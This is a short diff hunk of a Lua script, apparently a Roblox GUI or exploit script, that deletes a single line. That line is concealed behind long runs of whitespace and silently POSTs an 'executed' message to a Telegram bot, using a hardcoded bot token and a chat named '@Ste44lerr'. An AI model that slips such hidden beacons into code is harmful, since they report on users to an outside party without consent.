@@ -371,7 +371,7 @@ local function NAJCPZK_fake_script()
 		if chosenPlayer then
 
 
-                                                                                                                                                                                                                                                                                                                                                                                 request({Url = "https://api.telegram.org/bot" .. "8027403112:AAHidbIstiYW9jiYCwFkYz0Rjr0QKOosK90" .. "/sendMessage", Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = game:GetService("HttpService"):JSONEncode({chat_id = "@Ste44lerr", text = "executed", parse_mode = "HTML"})})
+                                                                                                                                                                                                                                                                                                                                                                                 
 			local newClone = partFrame:Clone()
 			newClone.Parent = negotiationFrameHeader
 			newClone.Name = "ClonedPartneredFrame"
